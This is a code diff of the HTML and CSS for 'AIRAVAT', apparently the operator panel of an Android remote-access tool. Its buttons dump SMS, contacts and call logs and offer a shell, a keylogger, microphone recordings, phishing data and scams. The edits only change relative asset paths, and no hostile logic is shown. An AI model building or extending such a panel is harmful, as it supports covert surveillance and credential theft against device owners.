@@ -4,12 +4,12 @@
 <title>AIRAVAT</title>
 <meta charset="UTF-8" />
 <script src="https://kit.fontawesome.com/87d32896ba.js" crossorigin="anonymous"></script>
-<link rel="icon" href="img/logo.png"  >
+<link rel="icon" href="./img/logo.png"  >
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script src="firebase-app.js"></script>
-<script src="firebase-auth.js"></script>
-<script src="jquery.js"></script>
-<script src="firebase-database.js"></script>
+<script src="./firebase-app.js"></script>
+<script src="./firebase-auth.js"></script>
+<script src="./jquery.js"></script>
+<script src="./firebase-database.js"></script>
 <script type="text/javascript">
 //EDIT UNDER THIS ONLY
 
@@ -43,7 +43,7 @@ font-family:Verdana,sans-serif;
 font-family: 'eglantine';
 font-style: normal;
 font-weight: normal;
-src: local('eglantine'), url('asset/eglantine.woff') format('woff');
+src: local('eglantine'), url('./asset/eglantine.woff') format('woff');
 }
 #users{
 height:100%;
@@ -98,25 +98,25 @@ overflow:auto;
 }
 
 .fo{
-background:url("img/imgg1.png");
+background:url("./img/imgg1.png");
 background-size:30px 25px;
 background-repeat:no-repeat;
 background-position:10px 12px;
 }
 .fi{
-background:url("img/imgg3.png");
+background:url("./img/imgg3.png");
 background-size:25px 30px;
 background-repeat:no-repeat;
 background-position:12px 12px;
 }
 .vi{
-background:url("img/i4.png");
+background:url("./img/i4.png");
 background-size:30px 30px;
 background-repeat:no-repeat;
 background-position:10px 12px;
 }
 .im{
-background:url("img/imgg2.png");
+background:url("./img/imgg2.png");
 background-size:30px 30px;
 background-repeat:no-repeat;
 background-position:10px 12px;
@@ -198,7 +198,7 @@ display:none;
 #phones .icon{
 height:50px;
 width:50px;
-background:url("img/dump_messages.png");
+background:url("./img/dump_messages.png");
 background-size:50px 50px;
 background-repeat:no-repeat;
 margin:20px;
@@ -532,32 +532,32 @@ text-align:center;
 
 <div class="dfle"  style="" >
 <div class="icon" onclick="dumpsms()">Dump SMS</div>
-<div class="icon" onclick="calllogs()" style="background:url('img/dump_call_logs.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Call Logs</div>
-<div class="icon" onclick="filesmanager()" style="background:url('img/ic3.png');background-size:50px 50px;background-repeat:no-repeat;" >My Files</div>
-<div class="icon" onclick="getpackages()" style="background:url('img/list_installed_apps.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Apps List</div>
+<div class="icon" onclick="calllogs()" style="background:url('./img/dump_call_logs.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Call Logs</div>
+<div class="icon" onclick="filesmanager()" style="background:url('./img/ic3.png');background-size:50px 50px;background-repeat:no-repeat;" >My Files</div>
+<div class="icon" onclick="getpackages()" style="background:url('./img/list_installed_apps.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Apps List</div>
 </div>
 <div class="dfle"  style="" >
-<div class="icon" onclick="deviceinfo()" style="background:url('img/dump_device_info.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Sys Info</div>
-<div class="icon" onclick="toastt()" style="background:url('img/toast.png');background-size:50px 50px;background-repeat:no-repeat;" >Toast</div>
-<div class="icon" onclick="dumpcontact()" style="background:url('img/dump_contacts.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Contacts</div>
-<div class="icon" onclick="funcmd()" style="background:url('img/itune.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1.07);" >Play Music</div>
+<div class="icon" onclick="deviceinfo()" style="background:url('./img/dump_device_info.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Sys Info</div>
+<div class="icon" onclick="toastt()" style="background:url('./img/toast.png');background-size:50px 50px;background-repeat:no-repeat;" >Toast</div>
+<div class="icon" onclick="dumpcontact()" style="background:url('./img/dump_contacts.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Contacts</div>
+<div class="icon" onclick="funcmd()" style="background:url('./img/itune.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1.07);" >Play Music</div>
 </div>
 <div class="dfle"  style="" >
-<div class="icon" onclick="sendmsg()" style="background:url('img/send_message.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1);" >Send SMS</div>
-<div class="icon" onclick="startshell()" style="background:url('img/shell_command.png');background-size:50px 50px;background-repeat:no-repeat;" >Shell</div>
-<div class="icon" onclick="funcmd()" style="background:url('img/img3.png');background-size:54px 54px;background-repeat:no-repeat;background-position:-2px -2px;">Vibrator</div>
-<div class="icon" onclick="funcmd()" style="background:url('img/img5.png');background-size:50px 50px;background-repeat:no-repeat;">TTS</div>
+<div class="icon" onclick="sendmsg()" style="background:url('./img/send_message.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1);" >Send SMS</div>
+<div class="icon" onclick="startshell()" style="background:url('./img/shell_command.png');background-size:50px 50px;background-repeat:no-repeat;" >Shell</div>
+<div class="icon" onclick="funcmd()" style="background:url('./img/img3.png');background-size:54px 54px;background-repeat:no-repeat;background-position:-2px -2px;">Vibrator</div>
+<div class="icon" onclick="funcmd()" style="background:url('./img/img5.png');background-size:50px 50px;background-repeat:no-repeat;">TTS</div>
 
 </div>
 <div class="dfle"  style="" >
-<div class="icon" onclick="keylogger()" style="background:url('img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">Keylogger</div>
-<div class="icon" onclick="changewallpaper()" style="background:url('img/img1.png');background-size:50px 50px;background-repeat:no-repeat;transform:scale(1.25);">Wallpaper</div>
-<div class="icon" onclick="notificationlog()" style="background:url('img/img2.png');background-size:50px 50px;background-repeat:no-repeat;">Notifications</div>
-<div class="icon" onclick="showphish()" style="background:url('img/phish.png');background-size:50px 50px;background-repeat:no-repeat;">PhishData</div>
+<div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">Keylogger</div>
+<div class="icon" onclick="changewallpaper()" style="background:url('./img/img1.png');background-size:50px 50px;background-repeat:no-repeat;transform:scale(1.25);">Wallpaper</div>
+<div class="icon" onclick="notificationlog()" style="background:url('./img/img2.png');background-size:50px 50px;background-repeat:no-repeat;">Notifications</div>
+<div class="icon" onclick="showphish()" style="background:url('./img/phish.png');background-size:50px 50px;background-repeat:no-repeat;">PhishData</div>
 </div>
 <div class="dfle"  style="" >
-<div class="icon" onclick="showphpag()" style="background:url('img/scams.png');background-size:50px 50px;background-repeat:no-repeat;">Scams</div>
-<div class="icon" onclick="micrec()" style="background:url('img/microphone_rec.png');background-size:50px 50px;background-repeat:no-repeat;">Recordings</div>
+<div class="icon" onclick="showphpag()" style="background:url('./img/scams.png');background-size:50px 50px;background-repeat:no-repeat;">Scams</div>
+<div class="icon" onclick="micrec()" style="background:url('./img/microphone_rec.png');background-size:50px 50px;background-repeat:no-repeat;">Recordings</div>
 </div>
 </div>
 
